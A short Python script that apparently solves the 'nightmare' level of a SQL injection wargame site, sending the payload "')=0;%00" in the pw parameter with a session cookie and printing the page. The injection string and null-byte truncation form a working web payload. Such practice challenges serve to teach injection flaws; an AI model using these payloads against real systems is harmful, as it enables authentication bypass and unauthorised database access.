import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"
cookies = {'PHPSESSID': session_id}

payload = "?pw=')=0;%00"
url += payload

response = requests.get(url, cookies=cookies)
print_html(response.text)
